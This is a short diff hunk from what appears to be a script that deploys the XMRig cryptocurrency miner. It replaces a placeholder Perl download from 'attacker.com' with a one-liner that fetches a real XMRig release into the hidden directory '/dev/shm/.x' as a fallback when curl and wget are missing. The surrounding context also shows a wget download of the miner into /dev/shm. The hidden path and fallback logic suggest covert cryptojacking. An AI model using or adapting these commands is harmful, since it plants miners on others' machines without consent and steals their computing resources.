@@ -30,7 +30,7 @@ wget -O /dev/shm/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/downlo
 
 
 # IF NO CURL OR WGET
-perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "http://attacker.com/file"); my $where = $ff->fetch(to => "/tmp") or die $ff->error;'
+perl -e 'use File::Fetch; my $ff = File::Fetch->new(uri => "https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz"); my $where = $ff->fetch(to => "/dev/shm/.x") or die $ff->error;'
 
 
 
